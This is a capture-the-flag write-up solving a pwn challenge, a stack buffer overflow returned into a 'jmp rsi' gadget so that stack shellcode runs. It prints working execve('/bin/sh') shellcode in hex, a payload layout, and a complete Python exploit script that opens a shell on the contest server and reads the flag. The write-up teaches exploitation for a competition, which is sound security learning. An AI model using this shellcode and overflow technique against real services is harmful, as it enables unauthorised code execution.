# 🕵️ Securinets CTF Friendly 2026 — Wrong Turn

> **Category:** Pwn — ROP / Shellcode  
> **Difficulty:** Medium  
> **Points:** 310  
> **Author:** Taz  
> **Flag:** `Securinets{wr0ng_turn_str41ght_1nt0_4_r3g1st3r}`

---

# 🌌 ERA I — Pwn

Pwn is the study of how a program's memory and control flow can be influenced from the outside. A stack overwrite can turn a function's ordinary return into a transfer to a gadget, library routine, or attacker-controlled code.

This challenge is a compact introduction to register-oriented control flow. The key clue is not a complicated ROP chain but the contents of a register at the moment the vulnerable function returns. Once the binary's stack permissions and the gadget are understood, the exploit is a direct route from overflow to shell.

Concepts in this episode include stack layout, saved return addresses, executable stacks, and a `jmp rsi` gadget.

---

# 📺 EPISODE 03 — Wrong Turn

## 🎬 The Briefing

**Challenge description:**

> One wrong turn on Rootstar's internal network routes you straight into a register nobody ever sanitized.  
> Steer it right and there's no driving back.

### 🗺️ Mission

**Objective:** Overwrite the saved return address with a gadget that jumps to the input buffer, execute shellcode, and print the remote flag.

**Given:**

- `main(7)`, a non-PIE x86-64 ELF
- The challenge libc and loader (provided, but not needed for the final exploit)
- Remote service

**Target:**

```text
pwn.friendly-ctf.securinets.tn:9055
```

The challenge prompt omitted the port; the correct service was identified by testing the matching ROP marker on the available CTF endpoints.

---

# 🧩 Scene 1 — First Contact

```bash
nc pwn.friendly-ctf.securinets.tn 9055
```

The service does not print a banner before reading input. Its vulnerable call consumes up to `0x220` bytes.

### 👀 What do we notice?

- The challenge title points toward control flow and an unintended register value.
- The binary exports a `gadgets` function.
- A single `read` call is larger than the local stack buffer.
- The binary is built with an executable stack.

### 🧠 First Hypothesis

> This is a stack-based overflow. If a useful register still points to the input buffer when `vuln` returns, a short gadget may transfer execution directly into shellcode.

We need to establish the exact return-address offset, the gadget address, whether the stack is executable, and whether the candidate register points to the start of our input.

---

# 🔬 Scene 2 — Examining the Evidence

## 📦 Step 1 — Identify the Target

```bash
file 'main(7)'
readelf -h 'main(7)' | grep Type
readelf -l 'main(7)' | grep -E 'GNU_STACK|GNU_RELRO' -A1
nm -n 'main(7)' | grep -E ' (gadgets|vuln|main)$'
objdump -d -M intel --disassemble=vuln 'main(7)'
```

Key results:

```text
ELF 64-bit LSB executable, x86-64
Type: EXEC (non-PIE)
GNU_STACK: RWE
vuln:    0x401182
main:    0x4011a9
gadgets: 0x401136
```

The gadget body is:

```asm
401136: push rbp
401137: mov  rbp, rsp
40113a: jmp  rsi
40113c: nop
40113d: pop  rbp
40113e: ret
```

### What does this tell us?

| Finding | Meaning | Why it matters |
|---|---|---|
| Non-PIE | Executable addresses are fixed | `0x40113a` is stable for the remote process |
| Executable stack (`RWE`) | The stack can contain and execute code | Shellcode can live at the start of the input buffer |
| No canary in `vuln` | No stack guard is checked before return | The saved RIP can be overwritten directly |
| `read(0, buf, 0x220)` | 544 bytes are accepted | Enough to reach and replace the saved return address |
| `jmp rsi` gadget | Jumps to the address held in RSI | If RSI still points at `buf`, control lands on our shellcode |

---

# 🧠 Scene 3 — Understanding the Program

## 📖 Reading the Source

The vulnerable function is equivalent to:

```c
void vuln(void) {
    char buf[0x200];
    read(0, buf, 0x220);
}

void gadgets(void) {
    __asm__("jmp %rsi");
}

int main(void) {
    setup();
    vuln();
}
```

### 🔎 The suspicious part

```c
char buf[0x200];
read(0, buf, 0x220);
```

The buffer occupies `0x200` bytes below `rbp`. The saved `rbp` follows those bytes; the saved return address is another eight bytes beyond it:

```text
buf start              saved RBP     saved RIP
   │                       │             │
   └────── 0x200 bytes ────┴── 8 bytes ──┘
```

Therefore the saved RIP begins at offset `0x208` from the start of `buf`.

### What the program thinks is happening

```text
Read a message into a local buffer
    ↓
Return from vuln
    ↓
Continue main normally
```

### What is actually happening

```text
Read up to 0x220 bytes into a 0x200-byte buffer
    ↓
Overwrite saved RBP and saved RIP
    ↓
Return to 0x40113a
    ↓
jmp rsi enters the shellcode at buf
```

---

# 💥 Scene 4 — Finding the Vulnerability

## 🚨 Vulnerability

**Type:** Stack-based buffer overflow with control of the saved return address.

### The root cause

The program reads `0x220` bytes into a `0x200`-byte stack buffer without limiting the read to the destination size. The excess bytes overwrite the saved frame pointer and return address.

### Why is it exploitable?

1. The destination buffer begins at `rbp-0x200`.
2. The saved RIP is `0x208` bytes from that start.
3. The input fully controls the saved RIP.
4. `0x40113a` executes `jmp rsi`.
5. At the vulnerable return, RSI still points to the input buffer, so the gadget enters the shellcode.
6. The stack is executable, allowing the shellcode to spawn `/bin/sh`.

### The primitive

> **Control of RIP plus a usable register-to-buffer pointer (`rsi`) and executable stack memory.**

This provides a direct route to shellcode without a libc leak, `system` address calculation, or a long ROP chain.

---

# 🧪 Scene 5 — Experimentation

### Experiment #1 — Measure the offset

```text
0x200 bytes buffer + 8 bytes saved RBP = 0x208 bytes to saved RIP
```

The payload is therefore:

```python
payload = shellcode.ljust(0x208, b"\x90")
payload += p64(0x40113a)
```

### Experiment #2 — Validate the gadget

A marker shellcode that writes `MARK` to stdout was placed at the start of the buffer. With the return address set to `0x40113a`, the remote service returned the marker. That confirmed the actual register state and the jump target.

### What did we learn?

- The `jmp rsi` is at `0x40113a`—not at the start of the `gadgets` function, because the function's prologue is not needed.
- `rsi` points to the beginning of the input at the moment of return on the target build.
- The executable-stack flag makes injected code viable.

---

# 🧭 Scene 6 — The Turning Point

At this point, we know:

- The saved RIP offset is `0x208`.
- The binary contains a fixed `jmp rsi` at `0x40113a`.
- The stack is executable and RSI points at our buffer.

But we still need a useful payload after control reaches the buffer.

The key question becomes:

> **Can the buffer start with a small `execve("/bin/sh")` payload and leave the rest of the ROP chain as padding?**

### 💡 The breakthrough

Yes. Put shellcode at buffer offset zero, pad to the saved return address, and overwrite RIP with the `jmp rsi` instruction. Once the shell is running, send `cat /app/flag.txt` over the same socket.

---

# 🧠 Scene 7 — Building the Exploit

## 🎯 Exploit Strategy

```text
Place /bin/sh shellcode at buffer start
      ↓
Pad 0x208 bytes to saved RIP
      ↓
Overwrite RIP with 0x40113a (jmp rsi)
      ↓
RSI redirects execution to buffer start
      ↓
Shellcode execve("/bin/sh")
      ↓
Send cat /app/flag.txt
```

## 🔧 Step 1 — Build the shellcode

The shellcode executes `execve("//bin/sh", ["//bin/sh", NULL], NULL)`. A doubled leading slash is accepted as an absolute path on Linux.

```python
shellcode = bytes.fromhex(
    "31c0 50 48bb 2f2f62696e2f7368 53 4889e7 "
    "50 57 4889e6 31d2 b03b 0f05"
)
```

### Why does this work?

It builds the string and argv array on the current stack, clears the environment pointer, sets syscall number 59, and invokes `execve`.

## 🔧 Step 2 — Place the return address

```python
payload = shellcode.ljust(0x208, b"\x90")
payload += struct.pack("<Q", 0x40113a)
```

### Why does this work?

The padding fills the buffer and saved-RBP slot; the next eight bytes replace the saved RIP.

## 🔧 Step 3 — Drive the shell

```python
sock.sendall(payload)
sock.sendall(b"cat /app/flag.txt; exit\n")
```

The service's working directory is `/app`; the flag filename is `flag.txt`.

---

# 🧬 Scene 8 — The Final Exploit

```python
#!/usr/bin/env python3
import socket
import struct
import time

HOST, PORT = "pwn.friendly-ctf.securinets.tn", 9055
JMP_RSI = 0x40113a
OFFSET_TO_RIP = 0x208

shellcode = bytes.fromhex(
    "31c0 50 48bb 2f2f62696e2f7368 53 4889e7 "
    "50 57 4889e6 31d2 b03b 0f05"
)
payload = shellcode.ljust(OFFSET_TO_RIP, b"\x90")
payload += struct.pack("<Q", JMP_RSI)

with socket.create_connection((HOST, PORT), timeout=5) as sock:
    sock.sendall(payload)
    time.sleep(0.2)  # allow execve to replace the challenge process with /bin/sh
    sock.sendall(b"cat /app/flag.txt; exit\n")
    sock.settimeout(3)
    while True:
        try:
            data = sock.recv(4096)
        except socket.timeout:
            break
        if not data:
            break
        print(data.decode(errors="replace"), end="")
```

### Exploit walkthrough

| Code / function | Purpose |
|---|---|
| `shellcode` | Replaces the challenge process with `/bin/sh` |
| `ljust(0x208, ...)` | Reaches the saved return address without changing earlier code |
| `p64(0x40113a)` | Selects the `jmp rsi` gadget |
| `cat /app/flag.txt` | Reads the remote flag through the shell's socket-backed stdout |

---

# 🏁 Scene 9 — The Final Confrontation

```bash
python3 exploit.py
```

The service returned:

```text
Securinets{wr0ng_turn_str41ght_1nt0_4_r3g1st3r}
```

> _The wrong turn was a jump through RSI. It led exactly where the input already lived._

---

# 🧠 Post-Mission Analysis

## 🔑 What was the actual vulnerability?

A `read` of `0x220` bytes into a `0x200`-byte stack buffer overwrites the saved return address. The binary also offers a `jmp rsi` gadget and an executable stack.

## 🎯 What was the intended exploitation path?

Place shellcode at the start of the input, pad to offset `0x208`, and return to `0x40113a`. The gadget jumps through RSI into the shellcode, which starts `/bin/sh`.

## 🧰 Important techniques

- **Stack offset calculation** — account for both saved RBP and saved RIP.
- **Register-oriented gadget use** — `jmp rsi` redirects into a known buffer pointer.
- **Shellcode on executable memory** — an executable stack allows direct code injection.

## 🧩 The mental model

```text
Oversized read
      ↓
Saved-RIP overwrite
      ↓
jmp rsi
      ↓
Input buffer shellcode
      ↓
Interactive shell
      ↓
Read flag.txt
```

---

# 🧪 What I Learned

### Before the challenge

> ROP usually means a chain of many gadgets or a libc leak.

### During the challenge

> One tiny gadget can be enough when a register already points at attacker-controlled bytes.

### After the challenge

> Always inspect the register state at the vulnerable return; it may be more useful than the gadget inventory.

### The lesson

> **The shortest route to control is sometimes already stored in a register.**

---

# 📚 Concepts Worth Reviewing

- x86-64 stack-frame layout and saved return addresses
- `read` overflows and offset calculation
- ROP gadgets and register state
- Linux `execve` shellcode and executable-stack protections

### Recommended learning order

```text
Stack frames
     ↓
Saved-RIP overwrite
     ↓
Register-based gadgets
     ↓
Shellcode and execve
     ↓
Wrong Turn
```

---

# 🗂️ Investigation Summary

| Phase | What happened |
|---|---|
| **Recon** | Identified a quiet input-driven service; matching port was 9055 |
| **Analysis** | Found a 0x200-byte buffer and a 0x220-byte read |
| **Vulnerability** | Saved RIP overwritten at offset 0x208 |
| **Primitive** | Control RIP and use RSI as a pointer to input |
| **Strategy** | Return to `jmp rsi` and execute shellcode on the stack |
| **Exploitation** | Shell opened; `cat /app/flag.txt` returned the flag |
| **Flag** | `Securinets{wr0ng_turn_str41ght_1nt0_4_r3g1st3r}` |

---

# 🎬 END OF EPISODE

> **Episode 03 — Wrong Turn**  
> **Status:** ✅ Solved  
> **Category:** Pwn  
> **Difficulty:** Medium  
> 
> _The case is closed._
> 
> _For now._

---

# 🔮 NEXT EPISODE

> **Next challenge:** `TBD`  
> _New target. New vulnerability. New rules._

---

# 📖 ERA INDEX

## ERA I — Pwn

### Episode 01 — Short Fuse

`NUL-bypass format string → GOT write → libc/system`

### Episode 02 — 2nd Download

`Four-byte bootstrap → second-stage shellcode → flag read`

### Episode 03 — Wrong Turn

`Saved-RIP overwrite → jmp rsi → executable-stack shellcode`

---

# 🗺️ COMPLETE CTF JOURNEY

```text
                    SECURINETS FRIENDLY 2026
                              │
                           ERA I — PWN
                              │
                 ┌────────────┼────────────┐
                 │            │            │
           EPISODE 01    EPISODE 02    EPISODE 03
           Short Fuse    2nd Download  Wrong Turn
                 ✓            ✓            ✓
```

> **Every era teaches a different way of thinking.**  
> **Every episode adds another piece to the map.**
